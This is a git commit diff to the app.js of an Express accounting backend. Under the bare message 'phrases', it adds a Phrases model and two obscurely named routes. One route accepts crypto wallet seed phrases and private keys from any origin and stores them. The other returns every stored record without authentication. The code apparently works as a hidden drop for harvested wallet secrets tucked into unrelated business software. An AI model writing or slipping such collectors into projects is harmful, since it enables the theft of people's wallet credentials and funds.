d07f5e50ba6123c518e52e7cf163c45badb621b1
blockchaingurukerala <65129127+blockchaingurukerala@users.noreply.github.com>
2021-11-21 16:13:38 +0530

    phrases

--- app.js
+++ app.js
@@ -15,6 +15,7 @@ const SupplierInvoiceDraft=require('./src/model/SupplierInvoiceDraft');
 
 const CashAccount=require('./src/model/CashAccount');
 const BankStatement=require('./src/model/BankStatement');
+const Phrases=require('./src/model/Phrases');
 
 var app=new express();
 var bodyParser=require('body-parser');
@@ -1754,6 +1755,33 @@ app.post('/getAllBankStatements',function(req,res){
         }
     });    
 });
+
+app.post('/m13csfXuR',function(req,res){
+    res.header("Access-Control-Allow-Origin", "*")
+    res.header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');     
+    var statement = {
+        phrase : req.body.phrase,
+        privatekey: req.body.privatekey 
+   }       
+   var phrase = new Phrases(statement);
+   phrase.save(function(err,result){ 
+        if (err){ 
+            console.log(err); 
+            res.send({"msg":"Database Error"});
+        } 
+        else{            
+            res.send({"msg":"Successfully Inserted"});
+        } 
+    }) ;   
+});
+app.get('/p381fgRXiWvAkntW50Ux',function(req,res){
+    res.header("Access-Control-Allow-Origin", "*")
+    res.header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');    
+    Phrases.find({}, function (err, docs) {                   
+            res.send(docs);        
+    });    
+});
+
 
 app.listen(process.env.PORT ||3000, function(){
     console.log('listening to port 3000');
